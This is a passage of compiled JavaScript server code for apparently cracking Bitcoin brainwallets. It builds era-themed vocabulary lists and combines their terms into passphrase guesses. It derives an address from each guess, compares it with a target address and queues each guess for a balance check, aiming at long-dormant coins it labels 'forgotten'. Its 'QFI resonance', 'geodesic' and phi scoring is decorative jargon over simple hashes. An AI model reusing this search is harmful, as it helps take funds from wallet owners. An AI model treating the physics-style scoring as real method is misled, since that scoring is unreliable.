          "[CulturalManifold] Initialized era lexicons:",
          Array.from(this.lexicons.keys()).map((k) => `${k}(${this.lexicons.get(k)?.length || 0})`).join(", ")
        );
      }
      /**
       * Satoshi Genesis Era (Jan 2009 - Oct 2009)
       * Only ~dozen active users, all cypherpunks
       * Bitcoin Core 0.1.0 only, SHA256 direct derivation
       */
      buildSatoshiGenesisLexicon() {
        const entries = [];
        const era = "satoshi-genesis";
        const cryptographyTerms = [
          "elliptic curve",
          "secp256k1",
          "ecdsa",
          "sha256",
          "ripemd160",
          "digital signature",
          "public key",
          "private key",
          "hash function",
          "merkle tree",
          "proof of work",
          "difficulty adjustment",
          "block reward",
          "double spend",
          "byzantine fault",
          "consensus mechanism",
          "nonce",
          "cryptographic hash",
          "one way function",
          "collision resistant",
          "preimage resistant",
          "birthday attack",
          "brute force",
          "key derivation",
          "deterministic wallet",
          "random oracle",
          "zero knowledge",
          "homomorphic",
          "quantum resistant",
          "post quantum",
          "lattice based",
          "hash based signature"
        ];
        const cypherpunkPhrases = [
          "privacy is necessary",
          "cypherpunks write code",
          "code is speech",
          "strong cryptography",
          "anonymity is a shield",
          "digital cash",
          "electronic money",
          "trusted third party",
          "peer to peer",
          "decentralized network",
          "distributed ledger",
          "chain of blocks",
          "timestamping service",
          "hashcash",
          "proof of work",
          "bit gold",
          "b-money",
          "reusable proof of work",
          "ecash",
          "digicash",
          "wei dai",
          "hal finney",
          "nick szabo",
          "adam back",
          "david chaum",
          "satoshi nakamoto",
          "chancellor on brink",
          "genesis block",
          "the times 03 jan 2009",
          "bailout",
          "bank failure",
          "financial crisis"
        ];
        const technicalPhrases = [
          "bitcoin core",
          "version 0.1",
          "main.cpp",
          "script.cpp",
          "connect block",
          "verify signature",
          "check transaction",
          "memory pool",
          "orphan block",
          "chain reorganization",
          "block header",
          "transaction input",
          "transaction output",
          "coinbase transaction",
          "block subsidy",
          "mining reward",
          "target difficulty",
          "retarget interval",
          "block time",
          "network hash rate",
          "cpu mining",
          "solo mining"
        ];
        const mailingListPhrases = [
          "bitcoin p2p e-cash",
          "cryptography mailing list",
          "metzdowd",
          "source forge",
          "open source",
          "gnu license",
          "peer review",
          "white paper",
          "technical specification",
          "protocol design",
          "network protocol",
          "tcp ip",
          "port 8333",
          "magic bytes",
          "version handshake",
          "inventory message"
        ];
        for (const term of cryptographyTerms) {
          entries.push({
            term,
            category: "cryptography",
            era,
            frequency: 0.8,
            source: "cryptography-mailing-list",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        for (const phrase of cypherpunkPhrases) {
          entries.push({
            term: phrase,
            category: "cypherpunk",
            era,
            frequency: 0.9,
            source: "cypherpunk-manifesto",
            qfiResonance: this.computeQFIResonance(phrase, era)
          });
        }
        for (const phrase of technicalPhrases) {
          entries.push({
            term: phrase,
            category: "technical",
            era,
            frequency: 0.7,
            source: "bitcoin-source",
            qfiResonance: this.computeQFIResonance(phrase, era)
          });
        }
        for (const phrase of mailingListPhrases) {
          entries.push({
            term: phrase,
            category: "mailing-list",
            era,
            frequency: 0.6,
            source: "metzdowd-archives",
            qfiResonance: this.computeQFIResonance(phrase, era)
          });
        }
        return entries;
      }
      /**
       * Satoshi Late Era (Nov 2009 - Dec 2010)
       * Growing community, still mostly technical
       */
      buildSatoshiLateLexicon() {
        const entries = [];
        const era = "satoshi-late";
        const expansionTerms = [
          "bitcoin forum",
          "bitcointalk",
          "pizza transaction",
          "laszlo",
          "10000 btc pizza",
          "first purchase",
          "gpu mining",
          "mining pool",
          "slush pool",
          "block erupter",
          "fpga miner",
          "asic miner",
          "difficulty increase",
          "hash power",
          "mining farm"
        ];
        const marketTerms = [
          "exchange rate",
          "bitcoin market",
          "mt gox",
          "trading volume",
          "liquidity",
          "order book",
          "bid ask spread",
          "market maker",
          "arbitrage"
        ];
        for (const term of expansionTerms) {
          entries.push({
            term,
            category: "expansion",
            era,
            frequency: 0.7,
            source: "bitcointalk-forum",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        for (const term of marketTerms) {
          entries.push({
            term,
            category: "market",
            era,
            frequency: 0.5,
            source: "early-exchanges",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        return entries;
      }
      /**
       * Early Adopter Era (2011 - 2012)
       * Pre-mainstream, still mostly technical users
       */
      buildEarlyAdopterLexicon() {
        const entries = [];
        const era = "early-adopter";
        const adoptionTerms = [
          "digital gold",
          "store of value",
          "medium of exchange",
          "unit of account",
          "deflationary",
          "fixed supply",
          "21 million",
          "halving event",
          "block reward halving",
          "scarcity",
          "sound money",
          "austrian economics",
          "gold standard",
          "fiat currency",
          "central banking"
        ];
        const technicalExpansion = [
          "electrum wallet",
          "deterministic wallet",
          "seed phrase",
          "hierarchical deterministic",
          "bip32",
          "master key",
          "extended key",
          "child key derivation",
          "hardened derivation"
        ];
        for (const term of adoptionTerms) {
          entries.push({
            term,
            category: "adoption",
            era,
            frequency: 0.7,
            source: "bitcointalk-forum",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        for (const term of technicalExpansion) {
          entries.push({
            term,
            category: "technical-expansion",
            era,
            frequency: 0.6,
            source: "bip-proposals",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        return entries;
      }
      /**
       * Silk Road Era (2011 - 2013)
       * Dark market influence, privacy focus
       */
      buildSilkRoadLexicon() {
        const entries = [];
        const era = "silk-road";
        const privacyTerms = [
          "anonymous transaction",
          "mixing service",
          "tumbler",
          "coinjoin",
          "stealth address",
          "ring signature",
          "zero knowledge proof",
          "confidential transaction",
          "tor network",
          "onion routing",
          "hidden service",
          "dread pirate roberts",
          "silk road",
          "darknet market"
        ];
        for (const term of privacyTerms) {
          entries.push({
            term,
            category: "privacy",
            era,
            frequency: 0.6,
            source: "darknet-forums",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        return entries;
      }
      /**
       * Mt. Gox Era (2013 - 2014)
       * Exchange dominance, mainstream attention
       */
      buildMtGoxLexicon() {
        const entries = [];
        const era = "mt-gox";
        const exchangeTerms = [
          "mt gox",
          "gox coins",
          "magic the gathering",
          "exchange hack",
          "cold storage",
          "hot wallet",
          "withdrawal delay",
          "transaction malleability",
          "bitcoin price",
          "all time high",
          "bubble",
          "bear market",
          "bull market",
          "hodl",
          "to the moon"
        ];
        for (const term of exchangeTerms) {
          entries.push({
            term,
            category: "exchange",
            era,
            frequency: 0.7,
            source: "reddit-bitcoin",
            qfiResonance: this.computeQFIResonance(term, era)
          });
        }
        return entries;
      }
      computeQFIResonance(term, era) {
        const normalizedTerm = term.toLowerCase().replace(/[^a-z0-9]/g, "");
        const termHash = this.hashString(normalizedTerm);
        const eraWeight = {
          "satoshi-genesis": 1,
          "satoshi-late": 0.9,
          "early-adopter": 0.8,
          "silk-road": 0.7,
          "mt-gox": 0.6,
          "post-gox": 0.5,
          "ico-boom": 0.4,
          "defi": 0.3,
          "institutional": 0.2
        };
        const baseResonance = termHash % 1e3 / 1e3;
        return baseResonance * eraWeight[era];
      }
      hashString(str) {
        let hash = 0;
        for (let i = 0; i < str.length; i++) {
          const char = str.charCodeAt(i);
          hash = (hash << 5) - hash + char;
          hash = hash & hash;
        }
        return Math.abs(hash);
      }
      /**
       * Detect era from blockchain temporal coordinate
       */
      detectEraFromTimestamp(timestamp2) {
        const year = timestamp2.getFullYear();
        const month = timestamp2.getMonth();
        if (year === 2009) {
          if (month < 10) return "satoshi-genesis";
          return "satoshi-late";
        }
        if (year === 2010) return "satoshi-late";
        if (year === 2011) return "early-adopter";
        if (year === 2012) return "early-adopter";
        if (year === 2013) return "mt-gox";
        if (year === 2014) return "post-gox";
        if (year >= 2015 && year <= 2016) return "post-gox";
        if (year >= 2017 && year <= 2018) return "ico-boom";
        if (year >= 2019 && year <= 2021) return "defi";
        return "institutional";
      }
      /**
       * Build software constraints for era
       */
      getSoftwareConstraints(era) {
        const constraints = {
          "satoshi-genesis": {
            availableWallets: ["bitcoin-core-0.1"],
            keyDerivationMethods: ["sha256-direct"],
            addressFormats: ["p2pkh"]
          },
          "satoshi-late": {
            availableWallets: ["bitcoin-core-0.1", "bitcoin-core-0.2", "bitcoin-core-0.3"],
            keyDerivationMethods: ["sha256-direct"],
            addressFormats: ["p2pkh"]
          },
          "early-adopter": {
            availableWallets: ["bitcoin-core", "electrum-1.x", "multibit"],
            keyDerivationMethods: ["sha256-direct", "electrum-v1"],
            addressFormats: ["p2pkh"]
          },
          "silk-road": {
            availableWallets: ["bitcoin-core", "electrum", "blockchain-info"],
            keyDerivationMethods: ["sha256-direct", "electrum-v1", "bip32"],
            addressFormats: ["p2pkh"]
          },
          "mt-gox": {
            availableWallets: ["bitcoin-core", "electrum", "blockchain-info", "armory"],
            keyDerivationMethods: ["sha256-direct", "electrum-v1", "electrum-v2", "bip32", "bip39"],
            addressFormats: ["p2pkh", "p2sh"]
          },
          "post-gox": {
            availableWallets: ["bitcoin-core", "electrum", "trezor", "ledger"],
            keyDerivationMethods: ["bip39", "bip32", "electrum-v2"],
            addressFormats: ["p2pkh", "p2sh"]
          },
          "ico-boom": {
            availableWallets: ["electrum", "trezor", "ledger", "exodus", "jaxx"],
            keyDerivationMethods: ["bip39", "bip32"],
            addressFormats: ["p2pkh", "p2sh", "p2wpkh"]
          },
          "defi": {
            availableWallets: ["electrum", "hardware-wallets", "mobile-wallets"],
            keyDerivationMethods: ["bip39", "bip32"],
            addressFormats: ["p2pkh", "p2sh", "p2wpkh", "p2wsh"]
          },
          "institutional": {
            availableWallets: ["hardware-wallets", "multisig", "custody-services"],
            keyDerivationMethods: ["bip39", "bip32"],
            addressFormats: ["p2pkh", "p2sh", "p2wpkh", "p2wsh", "p2tr"]
          }
        };
        return constraints[era];
      }
      /**
       * Build cultural context for era
       */
      getCulturalContext(era) {
        const contexts = {
          "satoshi-genesis": {
            primaryInfluences: ["cypherpunk-movement", "cryptography-research", "austrian-economics"],
            lexiconSources: ["cryptography-mailing-list", "metzdowd", "satoshi-emails"],
            typicalPhrasePatterns: ["technical-term", "cypherpunk-quote", "cryptography-reference"],
            technicalLevel: "expert",
            communityAffiliation: ["cypherpunks", "cryptographers", "early-bitcoiners"]
          },
          "satoshi-late": {
            primaryInfluences: ["cypherpunk-movement", "bitcointalk-forum", "mining-community"],
            lexiconSources: ["bitcointalk", "bitcoin-wiki", "irc-channels"],
            typicalPhrasePatterns: ["bitcoin-term", "mining-term", "forum-slang"],
            technicalLevel: "enthusiast",
            communityAffiliation: ["bitcointalk-members", "early-miners", "developers"]
          },
          "early-adopter": {
            primaryInfluences: ["libertarian-economics", "technology-enthusiasts", "gold-bugs"],
            lexiconSources: ["bitcointalk", "reddit", "blogs"],
            typicalPhrasePatterns: ["economic-term", "technology-term", "investment-term"],
            technicalLevel: "enthusiast",
            communityAffiliation: ["bitcoin-maximalists", "libertarians", "tech-enthusiasts"]
          },
          "silk-road": {
            primaryInfluences: ["privacy-advocates", "darknet-culture", "anarchism"],
            lexiconSources: ["darknet-forums", "tor-hidden-services", "reddit"],
            typicalPhrasePatterns: ["privacy-term", "anonymity-term", "market-term"],
            technicalLevel: "enthusiast",
            communityAffiliation: ["privacy-advocates", "darknet-users", "anarchists"]
          },
          "mt-gox": {
            primaryInfluences: ["trading-culture", "speculation", "mainstream-media"],
            lexiconSources: ["reddit", "twitter", "news-sites", "trading-forums"],
            typicalPhrasePatterns: ["trading-term", "meme-phrase", "price-prediction"],
            technicalLevel: "novice",
            communityAffiliation: ["traders", "speculators", "early-mainstream"]
          },
          "post-gox": {
            primaryInfluences: ["security-focus", "institutional-interest", "regulation"],
            lexiconSources: ["industry-news", "conferences", "research-papers"],
            typicalPhrasePatterns: ["security-term", "institutional-term", "regulatory-term"],
            technicalLevel: "enthusiast",
            communityAffiliation: ["developers", "security-researchers", "institutional-investors"]
          },
          "ico-boom": {
            primaryInfluences: ["ethereum-ecosystem", "token-economics", "mainstream-fomo"],
            lexiconSources: ["telegram", "discord", "crypto-twitter"],
            typicalPhrasePatterns: ["token-term", "defi-term", "meme-phrase"],
            technicalLevel: "novice",
            communityAffiliation: ["token-holders", "defi-users", "crypto-twitter"]
          },
          "defi": {
            primaryInfluences: ["smart-contracts", "yield-farming", "nft-culture"],
            lexiconSources: ["discord", "crypto-twitter", "dapp-interfaces"],
            typicalPhrasePatterns: ["defi-term", "nft-term", "yield-term"],
            technicalLevel: "enthusiast",
            communityAffiliation: ["defi-users", "nft-collectors", "yield-farmers"]
          },
          "institutional": {
            primaryInfluences: ["etf-approval", "corporate-treasury", "regulatory-clarity"],
            lexiconSources: ["financial-news", "sec-filings", "corporate-announcements"],
            typicalPhrasePatterns: ["financial-term", "regulatory-term", "institutional-term"],
            technicalLevel: "novice",
            communityAffiliation: ["institutional-investors", "wealth-managers", "corporate-treasuries"]
          }
        };
        return contexts[era];
      }
      /**
       * Create Block Universe coordinate from blockchain data
       */
      createCoordinate(timestamp2, spendingBehavior = "never-spent") {
        const era = this.detectEraFromTimestamp(timestamp2);
        return {
          temporal: timestamp2,
          era,
          culturalContext: this.getCulturalContext(era),
          softwareConstraint: this.getSoftwareConstraints(era),
          behavioralSignature: {
            transactionPatterns: [],
            spendingBehavior,
            hodlDuration: (Date.now() - timestamp2.getTime()) / (1e3 * 60 * 60 * 24 * 365),
            likelyLostReason: spendingBehavior === "never-spent" ? "forgotten" : "unknown"
          },
          manifoldPosition: this.computeManifoldPosition(timestamp2, era)
        };
      }
      computeManifoldPosition(timestamp2, era) {
        const position = new Array(64).fill(0);
        const daysSinceGenesis = (timestamp2.getTime() - (/* @__PURE__ */ new Date("2009-01-03")).getTime()) / (1e3 * 60 * 60 * 24);
        position[0] = Math.sin(daysSinceGenesis / 365 * Math.PI);
        position[1] = Math.cos(daysSinceGenesis / 365 * Math.PI);
        const eraIndex = [
          "satoshi-genesis",
          "satoshi-late",
          "early-adopter",
          "silk-road",
          "mt-gox",
          "post-gox",
          "ico-boom",
          "defi",
          "institutional"
        ].indexOf(era);
        position[2] = eraIndex / 9;
        for (let i = 3; i < 64; i++) {
          position[i] = Math.sin(daysSinceGenesis * (i - 2) / 100) * Math.exp(-i / 64);
        }
        return position;
      }
      /**
       * Generate geodesic candidates from cultural manifold
       */
      generateGeodesicCandidates(coordinate, count = 100) {
        const candidates = [];
        const lexicon = this.lexicons.get(coordinate.era) || [];
        if (lexicon.length === 0) {
          console.warn(`[CulturalManifold] No lexicon for era: ${coordinate.era}`);
          return candidates;
        }
        const sortedByResonance = [...lexicon].sort((a, b) => b.qfiResonance - a.qfiResonance);
        for (let i = 0; i < Math.min(count, sortedByResonance.length * 3); i++) {
          const candidate = this.generateSingleCandidate(sortedByResonance, coordinate, i);
          if (candidate && !this.testedPhrases.has(candidate.phrase)) {
            candidates.push(candidate);
          }
        }
        return candidates.sort((a, b) => b.combinedScore - a.combinedScore);
      }
      generateSingleCandidate(lexicon, coordinate, index2) {
        const numWords = 1 + index2 % 5;
        const words = [];
        for (let w = 0; w < numWords; w++) {
          const entryIndex = (index2 * 7 + w * 13) % lexicon.length;
          words.push(lexicon[entryIndex].term);
        }
        let phrase = words.join(" ");
        const variations = [
          phrase,
          phrase.toLowerCase(),
          phrase.toUpperCase(),
          phrase.replace(/\s+/g, ""),
          phrase.replace(/\s+/g, "_"),
          phrase.replace(/\s+/g, "-")
        ];
        phrase = variations[index2 % variations.length];
        if (this.testedPhrases.has(phrase)) {
          return null;
        }
        const culturalFit = this.computeCulturalFit(phrase, coordinate);
        const temporalFit = this.computeTemporalFit(phrase, coordinate);
        const softwareFit = this.computeSoftwareFit(phrase, coordinate);
        const qfiDistance = this.computeQFIDistance(phrase, coordinate);
        const combinedScore = culturalFit * 0.4 + temporalFit * 0.3 + softwareFit * 0.2 + (1 - qfiDistance) * 0.1;
        return {
          phrase,
          coordinate,
          qfiDistance,
          culturalFit,
          temporalFit,
          softwareFit,
          combinedScore,
          geodesicPath: [coordinate.manifoldPosition]
        };
      }
      computeCulturalFit(phrase, coordinate) {
        const lexicon = this.lexicons.get(coordinate.era) || [];
        const phraseLower = phrase.toLowerCase();
        let maxFit = 0;
        for (const entry of lexicon) {
          if (phraseLower.includes(entry.term.toLowerCase())) {
            maxFit = Math.max(maxFit, entry.frequency * entry.qfiResonance);
          }
        }
        return maxFit;
      }
      computeTemporalFit(phrase, coordinate) {
        const era = coordinate.era;
        if (era === "satoshi-genesis" || era === "satoshi-late") {
          const earlyTerms = ["cypherpunk", "cryptography", "hash", "proof of work", "sha256", "satoshi"];
          for (const term of earlyTerms) {
            if (phrase.toLowerCase().includes(term)) {
              return 0.9;
            }
          }
        }
        return 0.5;
      }
      computeSoftwareFit(phrase, coordinate) {
        const methods = coordinate.softwareConstraint.keyDerivationMethods;
        if (methods.includes("sha256-direct")) {
          if (phrase.length >= 8 && phrase.length <= 64) {
            return 0.8;
          }
        }
        if (methods.includes("bip39")) {
          const wordCount = phrase.split(/\s+/).length;
          if ([12, 15, 18, 21, 24].includes(wordCount)) {
            return 0.9;
          }
        }
        return 0.5;
      }
      computeQFIDistance(phrase, coordinate) {
        const cached = this.manifoldCurvature.get(phrase);
        if (cached !== void 0) {
          return cached;
        }
        const hash = this.hashString(phrase.toLowerCase());
        const baseDistance = hash % 1e4 / 1e4;
        const culturalBonus = this.computeCulturalFit(phrase, coordinate);
        const adjustedDistance = baseDistance * (1 - culturalBonus * 0.5);
        return Math.max(0, Math.min(1, adjustedDistance));
      }
      /**
       * Update manifold curvature after testing a candidate
       */
      updateManifoldCurvature(candidate, result) {
        this.testedPhrases.add(candidate.phrase);
        result.phi * (result.matched ? 1 : -0.1);
        this.manifoldCurvature.set(candidate.phrase, result.matched ? 0 : candidate.qfiDistance + 0.1);
        if (result.phi > 0.5 || result.matched) {
          candidate.geodesicPath.push([...candidate.coordinate.manifoldPosition]);
          this.geodesicHistory.push(candidate);
        }
        if (result.phi > 0.7) {
          const similarPhrases = this.findSimilarPhrases(candidate.phrase);
          for (const similar of similarPhrases) {
            const currentCurvature = this.manifoldCurvature.get(similar) || 0.5;
            this.manifoldCurvature.set(similar, currentCurvature - 0.05);
          }
        }
      }
      findSimilarPhrases(phrase) {
        const similar = [];
        const words = phrase.toLowerCase().split(/\s+/);
        const entries = Array.from(this.lexicons.entries());
        for (const [_era, lexicon] of entries) {
          for (const entry of lexicon) {
            const entryWords = entry.term.toLowerCase().split(/\s+/);
            const overlap = words.filter((w) => entryWords.includes(w)).length;
            if (overlap > 0 && entry.term !== phrase) {
              similar.push(entry.term);
            }
          }
        }
        return similar.slice(0, 10);
      }
      /**
       * Get high-resonance candidates for specific era
       */
      getHighResonanceCandidates(era, threshold = 0.7) {
        const lexicon = this.lexicons.get(era) || [];
        return lexicon.filter((e) => e.qfiResonance >= threshold);
      }
      /**
       * Get manifold statistics
       */
      getStatistics() {
        let totalCurvature = 0;
        const curvatureValues = Array.from(this.manifoldCurvature.values());
        for (const curvature of curvatureValues) {
          totalCurvature += curvature;
        }
        const eraLexiconSizes = {};
        const entries = Array.from(this.lexicons.entries());
        for (const [era, lexicon] of entries) {
          eraLexiconSizes[era] = lexicon.length;
        }
        return {
          testedPhrases: this.testedPhrases.size,
          geodesicPathLength: this.geodesicHistory.length,
          eraLexiconSizes,
          averageCurvature: this.manifoldCurvature.size > 0 ? totalCurvature / this.manifoldCurvature.size : 0.5
        };
      }
    };
    culturalManifold = new CulturalManifoldReconstructor();
  }
});

// server/geodesic-navigator.ts
var GeodesicNavigator, geodesicNavigator;
var init_geodesic_navigator = __esm({
  "server/geodesic-navigator.ts"() {
    "use strict";
    init_cultural_manifold();
    init_qig_universal();
    init_crypto();
    init_balance_queue_integration();
    GeodesicNavigator = class {
      curvatureHistory = [];
      currentPosition = new Array(64).fill(0);
      velocity = new Array(64).fill(0);
      bestPhiSeen = 0;
      bestCandidate = null;
      learningRate = 0.1;
      momentum = 0.9;
      explorationTemperature = 1;
      constructor() {
        console.log("[GeodesicNavigator] Initialized with 64-dimensional manifold navigation");
      }
      /**
       * Execute geodesic search on cultural manifold
       */
      async executeGeodesicSearch(config) {
        const { targetAddress, coordinate, maxCandidates, batchSize } = config;
        this.currentPosition = [...coordinate.manifoldPosition];
        this.learningRate = config.learningRate;
        this.explorationTemperature = config.explorationBias;
        console.log(`[GeodesicNavigator] Starting geodesic search for era: ${coordinate.era}`);
        console.log(`[GeodesicNavigator] Target: ${targetAddress}`);
        console.log(`[GeodesicNavigator] Temporal coordinate: ${coordinate.temporal.toISOString()}`);
        const highPhiCandidates = [];
        let candidatesTested = 0;
        let found = false;
        let matchedPhrase;
        while (candidatesTested < maxCandidates && !found) {
          const candidates = this.generateGeodesicBatch(coordinate, batchSize);
          for (const candidate of candidates) {
            candidatesTested++;
            const result = await this.testCandidate(candidate, targetAddress);
            culturalManifold.updateManifoldCurvature(candidate, result);
            this.learnFromResult(candidate, result);
            if (result.matched) {
              found = true;
              matchedPhrase = candidate.phrase;
              console.log(`[GeodesicNavigator] \u2705 MATCH FOUND: "${matchedPhrase}"`);
              break;
            }
            if (result.phi > 0.5) {
              highPhiCandidates.push(candidate);
            }
            if (result.phi > this.bestPhiSeen) {
              this.bestPhiSeen = result.phi;
              this.bestCandidate = candidate;
              console.log(`[GeodesicNavigator] New best phi: ${result.phi.toFixed(4)} for "${candidate.phrase.substring(0, 30)}..."`);
            }
            if (candidatesTested % 100 === 0) {
              this.adjustExplorationTemperature(candidatesTested, maxCandidates);
            }
          }
          this.updateVelocity();
          this.stepAlongGeodesic();
          if (candidatesTested % 500 === 0) {
            console.log(`[GeodesicNavigator] Progress: ${candidatesTested}/${maxCandidates} tested, best phi: ${this.bestPhiSeen.toFixed(4)}`);
          }
        }
        return {
          found,
          matchedPhrase,
          candidatesTested,
          geodesicPathLength: this.curvatureHistory.length,
          finalManifoldPosition: [...this.currentPosition],
          highPhiCandidates: highPhiCandidates.sort((a, b) => b.combinedScore - a.combinedScore).slice(0, 20),
          manifoldCurvatureLearned: this.computeLearnedCurvature()
        };
      }
      generateGeodesicBatch(coordinate, batchSize) {
        const candidates = culturalManifold.generateGeodesicCandidates(coordinate, batchSize * 2);
        const scored = candidates.map((c) => ({
          candidate: c,
          geodesicScore: this.computeGeodesicScore(c)
        }));
        scored.sort((a, b) => b.geodesicScore - a.geodesicScore);
        const exploitation = scored.slice(0, Math.floor(batchSize * (1 - this.explorationTemperature)));
        const exploration = scored.slice(Math.floor(batchSize * 0.3)).sort(() => Math.random() - 0.5).slice(0, Math.floor(batchSize * this.explorationTemperature));
        return [...exploitation, ...exploration].map((s) => s.candidate);
      }
      computeGeodesicScore(candidate) {
        let distance = 0;
        for (let i = 0; i < 64; i++) {
          const diff = candidate.coordinate.manifoldPosition[i] - this.currentPosition[i];
          distance += diff * diff;
        }
        distance = Math.sqrt(distance);
        const positionScore = 1 / (1 + distance);
        let velocityAlignment = 0;
        const velocityMag = Math.sqrt(this.velocity.reduce((sum, v) => sum + v * v, 0));
        if (velocityMag > 1e-3) {
          for (let i = 0; i < 64; i++) {
            const diff = candidate.coordinate.manifoldPosition[i] - this.currentPosition[i];
            velocityAlignment += diff / (distance + 1e-3) * (this.velocity[i] / velocityMag);
          }
        }
        const combinedScore = candidate.combinedScore * 0.4 + positionScore * 0.3 + (velocityAlignment + 1) / 2 * 0.3;
        return combinedScore;
      }
      async testCandidate(candidate, targetAddress) {
        try {
          const generatedAddress = generateBitcoinAddress(candidate.phrase);
          const matched = generatedAddress === targetAddress;
          queueAddressForBalanceCheck(candidate.phrase, "geodesic-navigator", 3);
          const qigScore = scoreUniversalQIG(candidate.phrase, "arbitrary");
          return {
            matched,
            phi: matched ? 1 : qigScore.phi * candidate.combinedScore,
            kappa: qigScore.kappa
          };
        } catch {
          return { matched: false, phi: 0, kappa: 0 };
        }
      }
      learnFromResult(candidate, result) {
        const gradient = new Array(64).fill(0);
        for (let i = 0; i < 64; i++) {
          const direction = candidate.coordinate.manifoldPosition[i] - this.currentPosition[i];
          gradient[i] = direction * (result.phi - 0.5);
        }
        this.curvatureHistory.push({
          position: [...this.currentPosition],
          gradient,
          phiResponse: result.phi,
          kappaResponse: result.kappa,
          timestamp: /* @__PURE__ */ new Date()
        });
        if (this.curvatureHistory.length > 1e3) {
          this.curvatureHistory = this.curvatureHistory.slice(-500);
        }
      }
      updateVelocity() {
        if (this.curvatureHistory.length < 5) return;
        const recent = this.curvatureHistory.slice(-10);
        const avgGradient = new Array(64).fill(0);
        let weightSum = 0;
        for (let i = 0; i < recent.length; i++) {
          const weight = recent[i].phiResponse;
          weightSum += weight;
          for (let j = 0; j < 64; j++) {
            avgGradient[j] += recent[i].gradient[j] * weight;
          }
        }
        if (weightSum > 0) {
          for (let j = 0; j < 64; j++) {
            avgGradient[j] /= weightSum;
          }
        }
        for (let i = 0; i < 64; i++) {
          this.velocity[i] = this.momentum * this.velocity[i] + this.learningRate * avgGradient[i];
        }
      }
      stepAlongGeodesic() {
        for (let i = 0; i < 64; i++) {
          this.currentPosition[i] += this.velocity[i];
          this.currentPosition[i] = Math.max(-1, Math.min(1, this.currentPosition[i]));
        }
      }
      adjustExplorationTemperature(tested, max) {
        const progress = tested / max;
        if (this.bestPhiSeen > 0.7) {
          this.explorationTemperature = Math.max(0.1, 0.3 * (1 - progress));
        } else if (this.bestPhiSeen > 0.5) {
          this.explorationTemperature = 0.4 + 0.2 * (1 - progress);
        } else {
          this.explorationTemperature = 0.7 + 0.3 * (1 - progress);
        }
      }
      computeLearnedCurvature() {
        if (this.curvatureHistory.length < 10) return 0;
        const phiValues = this.curvatureHistory.map((c) => c.phiResponse);
        const mean = phiValues.reduce((a, b) => a + b, 0) / phiValues.length;
        const variance = phiValues.reduce((sum, p) => sum + (p - mean) ** 2, 0) / phiValues.length;
        return Math.sqrt(variance);
      }
      /**
       * Generate candidates specifically for Satoshi Genesis era
       */
      generateSatoshiEraCandidates(timestamp2, count = 50) {
        const coordinate = culturalManifold.createCoordinate(timestamp2, "never-spent");
        return culturalManifold.generateGeodesicCandidates(coordinate, count);
      }
      /**
       * Get navigation statistics
       */
      getStatistics() {
        return {
          currentPosition: [...this.currentPosition],
          velocity: [...this.velocity],
          bestPhiSeen: this.bestPhiSeen,
          bestCandidatePhrase: this.bestCandidate?.phrase || null,
          curvatureHistoryLength: this.curvatureHistory.length,
          explorationTemperature: this.explorationTemperature,
          manifoldStats: culturalManifold.getStatistics()
        };
      }
      /**
       * Reset navigator state for new search
       */
      reset() {
        this.curvatureHistory = [];
        this.currentPosition = new Array(64).fill(0);
        this.velocity = new Array(64).fill(0);
        this.bestPhiSeen = 0;
        this.bestCandidate = null;
        this.explorationTemperature = 1;
        console.log("[GeodesicNavigator] Reset for new search");
      }
    };
    geodesicNavigator = new GeodesicNavigator();
  }
});

// server/attention-metrics.ts
import { createHash as createHash7 } from "crypto";
function measureKappaAtScale(contextLength, sampleCount = 100) {
  const kappaValues = [];
  const phiValues = [];
  for (let i = 0; i < sampleCount; i++) {
    const pattern = generateAttentionPattern(contextLength, i);
    const { kappa, phi } = computeIntegrationMetrics(pattern, contextLength);
    kappaValues.push(kappa);
    phiValues.push(phi);
  }
  const avgKappa = kappaValues.reduce((a, b) => a + b, 0) / kappaValues.length;
  const avgPhi = phiValues.reduce((a, b) => a + b, 0) / phiValues.length;
  const variance = kappaValues.reduce((sum, k) => sum + (k - avgKappa) ** 2, 0) / kappaValues.length;
  return {
    contextLength,
    kappa: avgKappa,
    phi: avgPhi,
    measurements: sampleCount,
    variance,
    timestamp: /* @__PURE__ */ new Date()
  };
}
function generateAttentionPattern(contextLength, seed) {
  const pattern = new Float64Array(contextLength);
  const hash = createHash7("sha256").update(`attention_${contextLength}_${seed}`).digest();
  let totalWeight = 0;
  for (let i = 0; i < contextLength; i++) {
    const recencyWeight = Math.exp(-i / (contextLength / 4));
    const periodicWeight = Math.cos(i * Math.PI / 32) * 0.3 + 0.7;
    const hashByte = hash[i % hash.length];
    const randomWeight = hashByte / 255 * 0.4 + 0.6;
    pattern[i] = recencyWeight * periodicWeight * randomWeight;
    totalWeight += pattern[i];
  }
  for (let i = 0; i < contextLength; i++) {
    pattern[i] /= totalWeight;
  }
  return pattern;
}
function computeIntegrationMetrics(pattern, contextLength) {
  const n = pattern.length;
  let fisherInfo = 0;
  let entropy = 0;
  for (let i = 0; i < n; i++) {
    const p = Math.max(pattern[i], 1e-10);
    entropy -= p * Math.log(p);
    if (i > 0 && i < n - 1) {
      const gradient = (pattern[i + 1] - pattern[i - 1]) / 2;
      const logGradient = gradient / p;
      fisherInfo += logGradient * logGradient * p;
    }
  }
  const normalizedFisher = fisherInfo * n;
  const scaleContribution = Math.sqrt(Math.log2(contextLength));
  const baseKappa = Math.min(100, normalizedFisher * 10);
  const kappaEffective = baseKappa * (1 - Math.exp(-scaleContribution / 3)) * (PHYSICS_BETA.kappaStar / 50) + PHYSICS_BETA.kappaStar * (1 - Math.exp(-contextLength / 2e3));
  const kappa = Math.max(20, Math.min(100, kappaEffective));
  const maxEntropy = Math.log(n);
  const normalizedEntropy = entropy / maxEntropy;
  const phi = 4 * normalizedEntropy * (1 - normalizedEntropy);
  return { kappa, phi };
}
function computeBetaFunction(measurement1, measurement2) {
  const L1 = measurement1.contextLength;
  const L2 = measurement2.contextLength;
  const kappa1 = measurement1.kappa;
  const kappa2 = measurement2.kappa;
  const deltaKappa = kappa2 - kappa1;
  const meanKappa = (kappa1 + kappa2) / 2;
  const deltaLnL = Math.log(L2) - Math.log(L1);
  const beta = deltaKappa / (meanKappa * deltaLnL);
  const _scaleRatio = L2 / L1;
  let referenceBeta;
  if (L1 <= 256) {
    referenceBeta = PHYSICS_BETA.emergence;
  } else if (L1 <= 1024) {
